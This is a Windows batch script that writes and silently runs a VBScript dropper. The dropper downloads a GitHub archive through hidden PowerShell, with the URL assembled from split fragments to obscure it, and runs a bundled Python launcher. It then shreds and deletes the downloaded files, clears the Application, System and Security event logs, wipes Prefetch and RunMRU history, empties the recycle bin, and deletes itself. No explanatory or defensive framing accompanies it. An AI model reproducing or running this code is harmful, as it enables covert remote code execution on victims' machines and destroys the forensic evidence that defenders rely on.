@echo off
cd /d "%TEMP%"

set "vbs=%TEMP%\core.vbs"

(
echo On Error Resume Next
echo Randomize
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo Set shell = CreateObject^("WScript.Shell"^)
echo.
echo u1 = "https://"
echo u2 = "github."
echo u3 = "com/"
echo u4 = "brayan"
echo u5 = "jhoance"
echo u6 = "2-collab/"
echo u7 = "encrip"
echo u8 = "tado/"
echo u9 = "archive/"
echo u10 = "refs/heads/"
echo u11 = "main.zip"
echo repoURL = u1 ^& u2 ^& u3 ^& u4 ^& u5 ^& u6 ^& u7 ^& u8 ^& u9 ^& u10 ^& u11
echo.
echo tempDir = shell.ExpandEnvironmentStrings^("%%TEMP%%"^)
echo zipPath = tempDir ^& "\repo.zip"
echo extractPath = tempDir ^& "\extracted"
echo.
echo psCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
echo "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^& _
echo "$ProgressPreference = 'SilentlyContinue'; " ^& _
echo "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
echo "try { " ^& _
echo "  $wc = New-Object Net.WebClient; " ^& _
echo "  $wc.Headers.Add('User-Agent', 'Mozilla/5.0 ^(Windows NT 10.0; Win64; x64^) AppleWebKit/537.36'^); " ^& _
echo "  $wc.DownloadFile('" ^& repoURL ^& "', '" ^& zipPath ^& "''^); " ^& _
echo "  Expand-Archive -Path '" ^& zipPath ^& "' -DestinationPath '" ^& extractPath ^& "' -Force " ^& _
echo "} catch { exit 1 }" ^& Chr^(34^)
echo.
echo shell.Run psCmd, 0, True
echo WScript.Sleep 8000
echo.
echo If Not fso.FileExists^(zipPath^) Then
echo   WScript.Quit
echo End If
echo.
echo WScript.Sleep 2000
echo.
echo repoPath = ""
echo launcherPath = ""
echo pythonPath = ""
echo.
echo If fso.FolderExists^(extractPath^) Then
echo   For Each subfolder In fso.GetFolder^(extractPath^).SubFolders
echo     If LCase^(subfolder.Name^) = "encriptado-main" Then
echo       repoPath = subfolder.Path
echo       launcherPath = repoPath ^& "\launcher.py"
echo       pythonPath = repoPath ^& "\python_portable\python.exe"
echo       Exit For
echo     End If
echo   Next
echo End If
echo.
echo If repoPath ^<^> "" And fso.FileExists^(launcherPath^) And fso.FileExists^(pythonPath^) Then
echo   shell.CurrentDirectory = repoPath
echo   cmdLaunch = Chr^(34^) ^& pythonPath ^& Chr^(34^) ^& " " ^& Chr^(34^) ^& launcherPath ^& Chr^(34^)
echo   shell.Run cmdLaunch, 0, False
echo   WScript.Sleep 10000
echo End If
echo.
echo If fso.FileExists^(zipPath^) Then
echo   zipSize = fso.GetFile^(zipPath^).Size
echo   If zipSize ^> 0 And zipSize ^< 200000000 Then
echo     For pass = 1 To 5
echo       psShred = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
echo       "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
echo       "$bytes = New-Object byte[]" ^& zipSize ^& "; " ^& _
echo       "^(New-Object Random^).NextBytes^($bytes^); " ^& _
echo       "[IO.File]::WriteAllBytes^('" ^& zipPath ^& "', $bytes^)" ^& Chr^(34^)
echo       shell.Run psShred, 0, True
echo       WScript.Sleep 500
echo     Next
echo   End If
echo   fso.DeleteFile zipPath, True
echo End If
echo.
echo If fso.FolderExists^(extractPath^) Then
echo   For pass = 1 To 3
echo     For Each f In fso.GetFolder^(extractPath^).Files
echo       fSize = f.Size
echo       If fSize ^> 0 And fSize ^< 50000000 Then
echo         psShrF = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
echo         "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
echo         "$b = New-Object byte[]" ^& fSize ^& "; " ^& _
echo         "^(New-Object Random^).NextBytes^($b^); " ^& _
echo         "[IO.File]::WriteAllBytes^('" ^& f.Path ^& "', $b^)" ^& Chr^(34^)
echo         shell.Run psShrF, 0, True
echo         WScript.Sleep 200
echo       End If
echo     Next
echo     WScript.Sleep 500
echo   Next
echo   fso.DeleteFolder extractPath, True
echo End If
echo.
echo psClear = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " ^& Chr^(34^) ^& _
echo "$ErrorActionPreference = 'SilentlyContinue'; " ^& _
echo "Remove-Item 'C:\Windows\Prefetch\*.pf' -Force -ErrorAction SilentlyContinue; " ^& _
echo "Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue; " ^& _
echo "wevtutil cl Application 2^>$null; " ^& _
echo "wevtutil cl System 2^>$null; " ^& _
echo "wevtutil cl Security 2^>$null; " ^& _
echo "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force -ErrorAction SilentlyContinue" ^& Chr^(34^)
echo shell.Run psClear, 0, True
echo.
echo WScript.Sleep 3000
echo.
echo scriptPath = WScript.ScriptFullName
echo cleanupBat = tempDir ^& "\cleanup.bat"
echo Set fc = fso.CreateTextFile^(cleanupBat, True^)
echo fc.WriteLine "@echo off"
echo fc.WriteLine "timeout /t 10 /nobreak ^>nul"
echo fc.WriteLine "taskkill /f /im wscript.exe ^>nul 2^>^&1"
echo fc.WriteLine "taskkill /f /im python.exe ^>nul 2^>^&1"
echo fc.WriteLine "del /f /q " ^& Chr^(34^) ^& scriptPath ^& Chr^(34^) ^& " ^>nul 2^>^&1"
echo fc.WriteLine "cd /d %%TEMP%%"
echo fc.WriteLine "rmdir /s /q " ^& Chr^(34^) ^& extractPath ^& Chr^(34^) ^& " ^>nul 2^>^&1"
echo fc.WriteLine "^(goto^) 2^>nul ^& del /f /q " ^& Chr^(34^) ^& "%%~f0" ^& Chr^(34^) ^& " ^& exit"
echo fc.Close
echo.
echo shell.Run "cmd.exe /c " ^& Chr^(34^) ^& cleanupBat ^& Chr^(34^), 0, False
echo WScript.Quit
) > "%vbs%"

start /min wscript.exe "%vbs%" //B //Nologo

timeout /t 2 /nobreak >nul
del /f /q "%~f0" >nul 2>&1
exit